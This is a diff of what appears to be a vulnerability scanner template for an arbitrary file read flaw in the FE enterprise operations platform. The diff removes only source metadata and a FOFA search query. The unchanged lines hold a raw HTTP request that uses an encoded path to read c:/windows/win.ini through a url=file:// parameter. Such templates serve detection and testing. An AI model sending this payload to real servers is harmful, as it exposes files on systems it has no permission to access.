@@ -3,12 +3,8 @@ info:
   name: 飞企互联-FE企业运营管理平台 ProxyServletUti 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cm7ng2icpeslfbxs'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cm7ng2icpeslfbxs
-    fofa: app="FE-协作平台"
 http:
 - raw:
   - 'GET /ProxyServletUti%6c?url=file:///c:/windows/win.ini HTTP/1.1
